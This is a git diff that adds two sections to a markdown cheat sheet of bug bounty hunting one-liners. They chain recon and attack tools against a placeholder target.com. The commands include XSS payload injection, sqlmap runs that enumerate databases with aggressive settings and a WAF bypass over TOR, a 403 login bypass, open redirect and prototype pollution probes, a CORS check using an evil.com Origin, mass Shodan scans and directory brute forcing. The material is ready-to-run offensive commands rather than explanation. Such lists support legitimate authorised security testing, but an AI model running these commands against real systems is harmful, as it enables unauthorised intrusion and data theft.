@@ -286,3 +286,232 @@ subdomain -d target.com -silent -all -recursive | httpx -silent | sed -s 's/$/\/
 ```
 python3 reflection.py urls.txt | grep "Reflection found" | awk -F'[?&]' '!seen[$2]++' | tee reflected.txt
 ```
+
+______________________
+
+## Part 2 
+
+# Bug Bounty Hunting Commands 🚀
+
+## 1. **Find XSS Vulnerabilities**  
+Uncover XSS vulnerabilities quickly using `dalfox`.
+
+```bash
+cat urls.txt | dalfox pipe --multicast -o xss.txt
+```
+
+---
+
+## 2. **Uncover Hidden Parameters in Seconds 🕵️‍♂️**  
+Extract hidden parameters from URLs effortlessly.
+
+**Example:**
+```bash
+cat alive.txt | rush curl -skl "{}" | grep 'type="hidden"' | grep -Eo 'name="[^"]+"' | cut -d'"' -f2 | sort -u | anew params.txt
+```
+
+---
+
+## 3. **Reveal Secrets in JavaScript Files 🕵️‍♂️**  
+Identify sensitive data in JavaScript files like a pro.
+
+**Example:**
+```bash
+cat alive.txt | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder
+```
+
+---
+
+## 4. **Crush Directories with Effortless Bruteforce 🔍**  
+Discover hidden directories and files effortlessly.
+
+**Example:**
+```bash
+cat alive.txt | xargs -I@ sh -c 'ffuf -c -w /path/to/wordlist -D -e php,aspx,html,do,ashx -u @/FUZZ -ac -t 200' | tee -a dir-ffuf.txt
+```
+
+---
+
+## 5. **Expose Log4J Vulnerabilities with Ease 🔍**  
+Identify Log4J vulnerabilities on the fly.
+
+**Example:**
+```bash
+cat alive.txt | xargs -I@ sh -c 'python3 /path/to/log4j-scan.py -u @'
+```
+
+---
+
+## 6. **Hunt Down Sneaky Open Redirects 🎯**  
+Uncover open redirects like a seasoned hunter.
+
+**Example:**
+```bash
+gau http://vuln.target.com | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
+```
+
+---
+
+## 7. **Capture Screenshots in a Snap 📷**  
+Capture screenshots of live websites effortlessly.
+
+**Example:**
+```bash
+assetfinder -subs-only http://target.com | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @'
+```
+
+---
+
+## 8. **Know Your WordPress Version 📝**  
+Discover the WordPress version of a target website instantly.
+
+**Example:**
+```bash
+curl -s 'https://target.com/readme.html' | grep 'Version'
+```
+
+---
+
+## 9. **Unearth Subdomains Containing JavaScript 🌐**  
+Find subdomains with JavaScript files in a snap.
+
+**Example:**
+```bash
+echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | anew JS
+```
+
+---
+
+## 10. **Bypass 403 Login Pages with Finesse 🚪**  
+Bypass 403 login pages like a pro.
+
+**Example:**
+```bash
+cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
+```
+
+_________________________
+# Part 3 
+
+
+# Bug Bounty Hunting One-Liner Commands 🚀
+
+## **1. Create a List of IPs and Scan**
+Prepare `my_ips.txt` with IP addresses, each on a new line:
+```bash
+192.168.1.1
+10.0.0.1
+cat my_ips.txt | xargs -L 100 -I {} shodan scan submit {} --wait 0
+```
+
+---
+
+## **2. Convert NMAP CIDR to Wordlist Text**
+Prepare `cidr.txt` with CIDR ranges or IP addresses:
+```bash
+cat cidr.txt | xargs -I @ sh -c 'nmap -v -sn @ | grep "Nmap scan report for" | sed "s/Nmap scan report for //g" | anew nmap-ips.txt'
+```
+
+---
+
+## **3. Use Shodan in Terminal to Search for IPs**
+```bash
+shodan search "Ssl.cert.subject.CN:\"target.com\"" --fields ip_str | anew ips.txt
+```
+
+---
+
+## **4. Censys for Specific Domain and Extract IP Addresses**
+```bash
+censys search "target.com" --index-type hosts | jq -c '.results[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
+```
+
+---
+
+## **5. Resolve and Save IP Addresses from Domains**
+```bash
+cat live-domain.txt | httpx -ip -silent -timeout 10 | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | tee domains-ips.txt
+```
+
+---
+
+## **6. Directory Fuzzing**
+**Using ffuf**:
+```bash
+ffuf -c -w urls.txt:URL -W wordlist.txt:FUZZ -u URL/FUZZ -mc all -fc 500,502 -ac -recursion -v -of json -o output.json
+```
+
+**Using Dirsearch**:
+```bash
+dirsearch -l urls.txt -w /path/to/wordlist.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,py,rb,php,tar,zip,txt,xml --deep --recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt
+```
+
+---
+
+## **7. SQLi Vulnerabilities with Katana, Hakrawler, and Gau**
+```bash
+cat subs.txt | gau || hakrawler || katana || waybackurls | grep "=" | sort -u | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level=5 --risk=3 --dbs && while read -r url; do ghauri -u "$url" --level=3 --dbs --current-db --batch --confirm; done < tmp-sqli.txt
+```
+
+---
+
+## **8. SQLMAP with WAF Bypass via TOR**
+```bash
+sqlmap -r request.txt --time-sec=10 --tor-type=SOCKS5 --check-tor --random-agent --tamper=space2comment --dbs
+```
+
+---
+
+## **9. Find Sensitive Information Bugs with Wayback**
+```bash
+echo target.com | (gau || hakrawler || waybackurls || katana) | grep -Eoi '\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar)$'
+```
+
+---
+
+## **10. Extract Hidden Parameters in JS Files**
+```bash
+cat main.js | grep -oE '("[^"]*"|'[^']*'|\/[a-zA-Z0-9_/?=]+)' | sed -E 's/^["\']|["\']$//g' | sort -u
+```
+
+---
+
+## **11. Find Hidden Parameters in JS**
+```bash
+cat subs.txt | gau || hakrawler || waybackurls || katana | sort -u | httpx -silent -threads 100 | grep -Ev '\.(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt|pdf)$' | while read url; do vars=$(curl -s "$url" | grep -Eo 'var [a-zA-Z0-9_]+' | sed -e 's/var //' -e 's/$/='$url'/g' | grep -Ev '\.js$|[^\w]+\.js|[^\w]+\.js\.[0-9]+$|[^\w]+\.js[0-9]+$' | sed 's/.*/FUZZ=/g'); echo -e "\e[1;33m$url\e[1;32m$vars"; done
+```
+
+---
+
+## **12. Subfinder + Httpx for Prototype Pollution Bug**
+```bash
+subfinder -d target.com -all -silent | httpx -silent -threads 100 | sed 's/$/\/\?__proto__[testparam]=exploit\//' | tee alive.txt | xargs -I % sh -c 'curl -s % | grep -Eo "window.testparam == \"exploit\" ? \"[VULNERABLE]\" : \"[NOT VULNERABLE]\"" | sed -e "s/[ \[\]JS]//g" | grep "VULNERABLE" && echo "%"'
+```
+
+---
+
+## **13. Find CORS Vulnerabilities**
+```bash
+echo target.com | gau || hakrawler || waybackurls || katana | while read url; do if curl -s -I -H "Origin: https://evil.com" -X GET "$url" | grep -q 'Access-Control-Allow-Origin: https://evil.com'; then echo "[Potential CORS Found] $url"; else echo "Nothing on $url"; fi; done
+```
+
+---
+
+## **14. Use Favicon Hash to Improve Hunting**
+```bash
+curl -s "https://favicon-hash.kmsec.uk/api/?url=https://www.google.com/favicon.ico" | jq
+```
+
+---
+
+## **15. One-Liner for XSS**
+```bash
+echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' | qsreplace '"><script>alert(1)</script>' | while read -r host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31mVulnerable\033[0m"; done
+```
+
+---
+
+## **Resources**
+- [KingOfBugBountyTips](https://github.com/OfJAAH/KingOfBugBountyTips)
+- [Awesome Oneliner Bug Bounty](https://github.com/dwisiswant0/awesome-oneliner-bugbounty)
+- [Oneliner Bug Bounty](https://github.com/twseptian/oneliner-bugbounty)
